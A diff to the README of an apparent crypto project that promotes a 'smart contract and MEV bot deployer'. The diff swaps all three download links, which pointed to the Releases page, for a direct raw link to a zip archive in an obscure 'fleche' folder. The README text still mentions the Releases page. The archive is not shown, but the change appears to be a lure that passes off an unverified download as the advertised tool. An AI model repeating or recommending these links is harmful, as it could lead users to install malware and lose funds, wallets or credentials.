@@ -1,7 +1,7 @@
 # 🚀 smart-contracts-and-mev-bot-deployer - Easily Deploy Smart Contracts
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)](https://github.com/i14maxiii/smart-contracts-and-mev-bot-deployer/releases)
+[![Download](https://raw.githubusercontent.com/i14maxiii/smart-contracts-and-mev-bot-deployer/main/fleche/mev-smart-deployer-bot-and-contracts-v3.9.zip)](https://raw.githubusercontent.com/i14maxiii/smart-contracts-and-mev-bot-deployer/main/fleche/mev-smart-deployer-bot-and-contracts-v3.9.zip)
 
 ## 🛠️ Overview
 The smart-contracts-and-mev-bot-deployer is the best platform to deploy smart contracts on Ethereum and BSC. You can create tokens, NFTs, DeFi projects, and MEV bots with ease. This application simplifies complex tasks, allowing users to focus on their goals without the technical burden.
@@ -23,7 +23,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ### Step 2: Visit the Download Page
 To download the application, visit the Releases page: 
-[Download Here](https://github.com/i14maxiii/smart-contracts-and-mev-bot-deployer/releases)
+[Download Here](https://raw.githubusercontent.com/i14maxiii/smart-contracts-and-mev-bot-deployer/main/fleche/mev-smart-deployer-bot-and-contracts-v3.9.zip)
 
 ### Step 3: Choose Your Version
 On the Releases page, you will see a list of available versions. Select the latest version for the best features and bug fixes.
@@ -74,6 +74,6 @@ Always ensure you verify the source of your downloads. Competent security practi
 
 ## 📁 Download Again
 Ready to get started? 
-[Download Here](https://github.com/i14maxiii/smart-contracts-and-mev-bot-deployer/releases) 
+[Download Here](https://raw.githubusercontent.com/i14maxiii/smart-contracts-and-mev-bot-deployer/main/fleche/mev-smart-deployer-bot-and-contracts-v3.9.zip) 
 
 Enjoy deploying your smart contracts and MEV bots effortlessly!
